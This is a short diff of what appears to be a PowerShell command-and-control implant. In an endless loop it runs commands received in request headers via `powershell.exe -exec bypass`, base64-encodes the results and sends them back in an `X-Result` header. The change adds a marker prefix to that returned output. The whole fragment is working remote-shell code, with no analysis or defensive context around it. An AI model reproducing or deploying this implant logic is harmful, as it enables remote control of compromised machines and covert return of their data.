@@ -34,8 +34,9 @@ while($true){
         else {
         Write-Output "$headers"
         $tr = powershell.exe -exec bypass -C "$headers"
+        $gtr="{{uii}}::"+$tr
         $headers = @{}
-        $b64tr = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($tr))
+        $b64tr = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($gtr))
         $headers.Add("X-Result",$b64tr)
         Write-Output $b64tr
 
